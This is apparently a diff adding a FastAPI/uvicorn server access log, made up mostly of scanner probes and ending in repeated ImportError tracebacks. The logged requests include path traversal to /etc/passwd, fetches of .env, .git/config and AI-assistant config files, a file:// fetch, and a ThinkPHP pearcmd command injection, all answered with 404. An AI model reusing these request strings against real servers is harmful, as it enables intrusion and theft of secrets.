+INFO:     172.104.74.45:10650 - "GET /spaces/viewdefaultdecorator.action?decoratorName HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:10672 - "GET /login/hostinfo2.cgi HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:10656 - "GET / HTTP/1.1" 200 OK
+INFO:     172.104.74.45:10644 - "GET /pages/csv_export_results_metadata.php?k=zulu&personaldata=0&allavailable=true&submit=1 HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:10720 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:10714 - "GET /services/user/values.xml?var=STATUS HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:10734 - "GET /wp-json/essential-blocks/v1/products?per_page=20 HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:10738 - "GET /wp-json/wp/v2/posts?per_page=1 HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:10730 - "GET /index.php?s=example HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:10728 - "GET /status?full=true HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:10762 - "GET /mifs/user/login.jsp HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:10768 - "GET /user/login HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:10780 - "GET /mics/login.jsp HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:10750 - "GET /?s=a&post_type=revision HTTP/1.1" 200 OK
+INFO:     172.104.74.45:10790 - "GET /index.php?rest_route=/whm/v3/themesettings HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:10794 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:10672 - "GET /Install/InstallWizard.aspx?__VIEWSTATE HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:10810 - "GET /ui/login/register HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:10656 - "GET /wp-content/plugins/video-synchro-pdf/reglages/Menu_Plugins/tout.php?p=tout HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:10650 - "GET /login/hostinfo.cgi HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:10644 - "GET /login.html HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:10798 - "GET / HTTP/1.1" 200 OK
+INFO:     172.104.74.45:10826 - "GET /signin HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:10798 - "GET /names.nsf/People?OpenView HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:10650 - "GET /en/products?query=123 HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:10644 - "GET /ad-list-search?keyword&keyword&lat&lat&long&long&location&category HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:10832 - "GET /?r=/getconfig HTTP/1.1" 200 OK
+INFO:     172.104.74.45:10840 - "GET /cs/Satellite?pagename=OpenMarket/Xcelerate/Admin/WebReferences HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:10840 - "GET /wp-json/wp/v2/statuses HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:10840 - "GET /wp-json/wpadverts/v1/classifieds-types HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:10840 - "GET /_nodes/_local/jvm%2Cos HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:10832 - "GET /i18n/component/JS?locale=en-US HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:10832 - "GET /index.php?r=/getconfig HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:10840 - "GET /cs/Satellite?pagename=OpenMarket/Xcelerate/Admin/Slots HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:43722 - "GET /?rest_route=/wp/v2/statuses HTTP/1.1" 200 OK
+INFO:     172.104.74.45:43722 - "GET /?rest_route=/wpadverts/v1/classifieds-types HTTP/1.1" 200 OK
+INFO:     172.104.74.45:43722 - "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:43722 - "GET /api/v1/version HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:43722 - "GET /public/login.htm?type=probes HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:24602 - "GET /public/login.htm?type=requests HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:24602 - "GET /fog/service/getversion.php HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:24612 - "GET /api/config HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:24606 - "GET /public/login.htm?type=treestat HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:24606 - "GET / HTTP/1.1" 200 OK
+INFO:     172.104.74.45:24606 - "GET /wp-content/plugins/hippoo/readme.txt HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:24606 - "GET /jmx-console/ HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:24612 - "GET /api/v1/repos/search?limit=1 HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:24612 - "GET /wp-content/plugins/protect-wp-admin/readme.txt HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:24606 - "GET / HTTP/1.1" 200 OK
+INFO:     172.104.74.45:24612 - "GET /wp-content/plugins/the-events-calendar/readme.txt HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:24606 - "GET /patroni HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:24606 - "GET /web-console/ HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:24612 - "GET / HTTP/1.1" 200 OK
+INFO:     172.104.74.45:24606 - "GET /wp-json HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:24606 - "GET /web-console/ServerInfo.jsp HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:24606 - "GET /wp-json?x=1 HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:24606 - "GET / HTTP/1.1" 200 OK
+INFO:     172.104.74.45:24606 - "GET /invoker/JMXInvokerServlet HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:24606 - "GET /login HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Unsupported upgrade request.
+WARNING:  No supported WebSocket library detected. Please use "pip install 'uvicorn[standard]'", or install 'websockets' or 'wsproto' manually.
+INFO:     39.98.33.193:34226 - "GET / HTTP/1.1" 200 OK
+INFO:     117.233.134.69:44984 - "GET /boaform/adminformLogout//boaform/admin/login.asp HTTP/1.0" 404 Not Found
+INFO:     45.88.191.82:39322 - "GET /.git/config HTTP/1.1" 404 Not Found
+INFO:     117.253.64.216:10962 - "GET /boaform/adminformLogout//boaform/admin/login.asp HTTP/1.0" 404 Not Found
+INFO:     198.235.24.168:58968 - "GET / HTTP/1.1" 200 OK
+INFO:     45.135.193.193:51504 - "CONNECT httpbin.org%3A443 HTTP/1.1" 404 Not Found
+INFO:     190.239.247.149:20841 - "GET / HTTP/1.1" 200 OK
+INFO:     34.62.59.98:41380 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     213.218.160.24:51848 - "GET /../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     213.218.160.24:51862 - "GET /../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     213.218.160.24:51876 - "GET /files/../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     213.218.160.24:51878 - "GET /cgi-bin/../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     213.218.160.24:51880 - "GET /../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     213.218.160.24:51892 - "GET /../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     213.218.160.24:51906 - "GET /assets/../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     213.218.160.24:51908 - "GET /static/../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     213.218.160.24:51916 - "GET /index.html/../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     213.218.160.24:51918 - "GET /../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     213.218.160.24:51924 - "GET /../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:      - "POST /request/tron.php HTTP/1.1" 404 Not Found
+INFO:     198.235.24.178:60586 - "GET /.well-known/security.txt HTTP/1.1" 404 Not Found
+INFO:      - "POST /admin/request/admin.php HTTP/1.1" 404 Not Found
+INFO:     45.198.224.125:53422 - "GET / HTTP/1.1" 200 OK
+INFO:     107.150.101.32:51922 - "GET / HTTP/1.1" 200 OK
+INFO:     107.150.101.32:51936 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     120.207.134.91:12858 - "GET /SDK/webLanguage HTTP/1.1" 404 Not Found
+INFO:     121.199.161.194:55772 - "GET / HTTP/1.0" 200 OK
+INFO:     121.199.161.194:56658 - "GET /nmaplowercheck1795380650 HTTP/1.1" 404 Not Found
+INFO:     121.199.161.194:56656 - "POST /sdk HTTP/1.1" 404 Not Found
+INFO:     121.199.161.194:56664 - "GET / HTTP/1.0" 200 OK
+INFO:     121.199.161.194:56668 - "GET /HNAP1 HTTP/1.1" 404 Not Found
+INFO:     121.199.161.194:56672 - "GET /evox/about HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     121.199.161.194:57354 - "GET / HTTP/1.0" 200 OK
+INFO:     121.199.161.194:57358 - "GET / HTTP/1.1" 200 OK
+INFO:     207.175.103.117:42166 - "GET / HTTP/1.1" 200 OK
+INFO:     35.233.85.54:56446 - "GET / HTTP/1.1" 200 OK
+INFO:     43.131.253.14:47124 - "GET / HTTP/1.1" 200 OK
+INFO:     45.135.193.193:46718 - "CONNECT httpbin.org%3A443 HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:43160 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:43174 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:43190 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:43194 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:43208 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:46332 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:46356 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:46404 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:46432 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:46442 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:46474 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:46486 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:46512 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:46534 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:46550 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:46568 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:46600 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:46602 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:46616 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:46630 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:46646 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:46666 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:46694 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:46708 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:46736 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:46758 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:46768 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:46796 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:46810 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:38304 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:38324 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:38344 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:38346 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:38370 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:38382 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:38402 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:38416 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:38440 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:38462 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:38478 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:38500 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:38518 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:38534 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:38554 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:38582 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:38584 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:38600 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:38614 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:38630 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:38640 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:38650 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:38654 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:38660 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:38662 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:49152 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:49166 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:49182 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:49184 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:49188 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:49200 - "SETROOTCERTIFICATE /favicon.ico/ HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     104.168.101.23:40344 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     104.168.101.23:40348 - "GET / HTTP/1.1" 200 OK
+INFO:     104.168.101.23:40364 - "GET /cgi-bin/../../../../../../../../../etc/hosts HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:40378 - "GET /.DS_Store HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:40394 - "GET /telescope/requests HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:40408 - "GET /api/geojson?url=file:///etc/hosts HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:40416 - "GET /.json HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:40420 - "GET /docker-compose.override.yml HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:40424 - "GET /docker-compose.yml HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:40428 - "GET /claude.md HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:40434 - "GET /.env.production HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:40450 - "GET /.s3.env HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:40452 - "GET /server.js HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:40468 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     104.168.101.23:40480 - "GET /main.js HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:40490 - "GET /.env.example HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:40498 - "GET /CONTEXT.md HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:40510 - "GET /config.json HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:40518 - "GET /auth.json HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:40522 - "GET /test.php HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:40528 - "GET /server.go HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:40540 - "GET /idx_config/ HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:40542 - "GET /main.py HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:51294 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:51296 - "GET /CLAUDE.md HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:51306 - "GET /.config HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:51308 - "GET /sftp-config.json HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:51324 - "GET /.sftp.json HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:51326 - "GET /Dockerfile HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:51336 - "GET /CLAUDE.MD HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:51340 - "GET /.claude/claude.json HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:51354 - "GET /server.py HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:51356 - "GET /Claude.md HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:51366 - "GET /.clauderc HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:51368 - "GET /.claude/claude.config.js HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:51380 - "GET /config.yml HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:51396 - "GET /docker-compose.yaml HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:51406 - "GET /dockerfile HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:51412 - "GET /PROMPT.md HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:51428 - "GET /%40fs/etc/passwd?import&raw?? HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:51432 - "GET /.secret HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:51444 - "GET /task.md HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:51452 - "GET /.claude/settings.json HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:51454 - "GET /login.action HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:51468 - "GET /info.php HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:51474 - "GET /config.yaml HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:51480 - "GET /.env.local HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:56762 - "GET /.git/config HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:56772 - "GET /phpinfo.php HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:56788 - "GET /README.md HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:56800 - "GET /.env.old HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:56806 - "GET /.env?import&raw?? HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:56808 - "GET /.env.backup HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:56810 - "GET /.env.save HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:56816 - "GET /Config.json HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:56826 - "GET /s/lkx/_/%3B/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:56842 - "GET /main.go HTTP/1.1" 404 Not Found
+INFO:     104.168.101.23:56852 - "GET /.vscode/sftp.json HTTP/1.1" 404 Not Found
+INFO:     47.95.207.195:34932 - "GET / HTTP/1.1" 200 OK
+INFO:     47.95.207.195:35014 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     67.213.127.123:51892 - "GET /cgi-bin/luci/%3Bstok%3D/locale HTTP/1.1" 404 Not Found
+INFO:     205.210.31.38:62652 - "GET /metrics HTTP/1.1" 404 Not Found
+INFO:     45.198.224.125:55814 - "GET / HTTP/1.1" 200 OK
+INFO:     101.32.208.70:39420 - "GET / HTTP/1.1" 200 OK
+INFO:     3.83.220.42:15152 - "GET / HTTP/1.1" 200 OK
+INFO:     112.12.16.220:10391 - "GET /docs HTTP/1.1" 200 OK
+INFO:     112.12.16.220:10391 - "GET /openapi.json HTTP/1.1" 200 OK
+INFO:     112.12.16.220:10392 - "GET / HTTP/1.1" 200 OK
+INFO:     101.69.106.125:6154 - "GET / HTTP/1.1" 200 OK
+INFO:     101.69.106.125:6155 - "GET / HTTP/1.1" 200 OK
+INFO:     101.69.106.125:6156 - "GET /api/subpages/search?kw=sienally HTTP/1.1" 200 OK
+INFO:     138.197.15.3:38810 - "GET /aaa9 HTTP/1.1" 404 Not Found
+INFO:     138.197.15.3:38820 - "GET /aab8 HTTP/1.1" 404 Not Found
+INFO:     117.92.86.95:17235 - "GET /login?redirect=%2Findex HTTP/1.1" 404 Not Found
+INFO:     117.92.86.95:17293 - "GET / HTTP/1.1" 200 OK
+INFO:     117.92.86.95:17309 - "GET / HTTP/1.1" 200 OK
+INFO:     117.92.86.95:17316 - "GET / HTTP/1.1" 200 OK
+INFO:     117.92.86.95:17322 - "GET / HTTP/1.1" 200 OK
+INFO:     117.92.86.95:17326 - "GET / HTTP/1.1" 200 OK
+INFO:     45.135.193.193:48864 - "CONNECT httpbin.org%3A443 HTTP/1.1" 404 Not Found
+INFO:     71.6.232.22:42134 - "GET / HTTP/1.1" 200 OK
+INFO:     104.248.207.186:34482 - "GET / HTTP/1.1" 200 OK
+INFO:     104.248.207.186:34482 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     146.190.134.221:38812 - "GET / HTTP/1.1" 200 OK
+INFO:     45.198.224.125:47284 - "GET / HTTP/1.1" 200 OK
+INFO:     104.155.66.115:46468 - "GET / HTTP/1.1" 200 OK
+INFO:     205.210.31.235:51825 - "GET / HTTP/1.0" 200 OK
+INFO:     43.134.68.29:57956 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     165.140.86.54:54948 - "POST /Action/login HTTP/1.1" 404 Not Found
+INFO:     143.198.27.231:55592 - "GET / HTTP/1.1" 200 OK
+INFO:     143.198.27.231:55602 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     147.182.217.27:54428 - "GET / HTTP/1.1" 200 OK
+INFO:     43.162.103.165:50750 - "GET / HTTP/1.1" 200 OK
+INFO:     198.235.24.185:59808 - "GET /metrics HTTP/1.1" 404 Not Found
+INFO:     101.36.119.11:49592 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     172.235.41.110:10218 - "GET / HTTP/1.1" 200 OK
+INFO:     45.198.224.125:40456 - "GET / HTTP/1.1" 200 OK
+INFO:     211.230.3.71:40482 - "GET /index.php?s=index/index/index/think_lang/../../extend/pearcmd/pearcmd/index&cmd=echo+K9ALPHA%3Becho+K9BETA HTTP/1.1" 404 Not Found
+INFO:     173.255.225.15:42600 - "GET / HTTP/1.1" 200 OK
+INFO:     45.135.193.193:34832 - "CONNECT httpbin.org%3A443 HTTP/1.1" 404 Not Found
+WARNING:  StatReload detected changes in 'utils/auth.py'. Reloading...
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [99158]
+INFO:     Started server process [109811]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+WARNING:  StatReload detected changes in 'routers/users.py'. Reloading...
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [109811]
+Traceback (most recent call last):
+  File "<string>", line 1, in <module>
+  File "/usr/lib64/python3.11/multiprocessing/spawn.py", line 122, in spawn_main
+    exitcode = _main(fd, parent_sentinel)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/multiprocessing/spawn.py", line 131, in _main
+    prepare(preparation_data)
+  File "/usr/lib64/python3.11/multiprocessing/spawn.py", line 246, in prepare
+    _fixup_main_from_path(data['init_main_from_path'])
+  File "/usr/lib64/python3.11/multiprocessing/spawn.py", line 297, in _fixup_main_from_path
+    main_content = runpy.run_path(main_path,
+                   ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "<frozen runpy>", line 291, in run_path
+  File "<frozen runpy>", line 98, in _run_module_code
+  File "<frozen runpy>", line 88, in _run_code
+  File "/home/public/Web/Project1/main.py", line 9, in <module>
+    from routers import news, subpages, users, products
+  File "/home/public/Web/Project1/routers/users.py", line 17, in <module>
+    from utils import auth
+  File "/home/public/Web/Project1/utils/auth.py", line 1, in <module>
+    from fastapi import Header, Depends, HttpException
+ImportError: cannot import name 'HttpException' from 'fastapi' (/usr/lib/python3.11/site-packages/fastapi/__init__.py)
+WARNING:  StatReload detected changes in 'routers/users.py'. Reloading...
+Traceback (most recent call last):
+  File "<string>", line 1, in <module>
+  File "/usr/lib64/python3.11/multiprocessing/spawn.py", line 122, in spawn_main
+    exitcode = _main(fd, parent_sentinel)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/multiprocessing/spawn.py", line 131, in _main
+    prepare(preparation_data)
+  File "/usr/lib64/python3.11/multiprocessing/spawn.py", line 246, in prepare
+    _fixup_main_from_path(data['init_main_from_path'])
+  File "/usr/lib64/python3.11/multiprocessing/spawn.py", line 297, in _fixup_main_from_path
+    main_content = runpy.run_path(main_path,
+                   ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "<frozen runpy>", line 291, in run_path
+  File "<frozen runpy>", line 98, in _run_module_code
+  File "<frozen runpy>", line 88, in _run_code
+  File "/home/public/Web/Project1/main.py", line 9, in <module>
+    from routers import news, subpages, users, products
+  File "/home/public/Web/Project1/routers/users.py", line 17, in <module>
+    from utils import auth
+  File "/home/public/Web/Project1/utils/auth.py", line 1, in <module>
+    from fastapi import Header, Depends, HttpException
+ImportError: cannot import name 'HttpException' from 'fastapi' (/usr/lib/python3.11/site-packages/fastapi/__init__.py)
+WARNING:  StatReload detected changes in 'utils/auth.py'. Reloading...
+Traceback (most recent call last):
+  File "<string>", line 1, in <module>
+  File "/usr/lib64/python3.11/multiprocessing/spawn.py", line 122, in spawn_main
+    exitcode = _main(fd, parent_sentinel)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/multiprocessing/spawn.py", line 131, in _main
+    prepare(preparation_data)
+  File "/usr/lib64/python3.11/multiprocessing/spawn.py", line 246, in prepare
+    _fixup_main_from_path(data['init_main_from_path'])
+  File "/usr/lib64/python3.11/multiprocessing/spawn.py", line 297, in _fixup_main_from_path
+    main_content = runpy.run_path(main_path,
+                   ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "<frozen runpy>", line 291, in run_path
+  File "<frozen runpy>", line 98, in _run_module_code
+  File "<frozen runpy>", line 88, in _run_code
+  File "/home/public/Web/Project1/main.py", line 9, in <module>
+    from routers import news, subpages, users, products
+  File "/home/public/Web/Project1/routers/users.py", line 17, in <module>
+    from utils import auth
+  File "/home/public/Web/Project1/utils/auth.py", line 1, in <module>
+    from fastapi import Header, Depends, HttpException
+ImportError: cannot import name 'HttpException' from 'fastapi' (/usr/lib/python3.11/site-packages/fastapi/__init__.py)
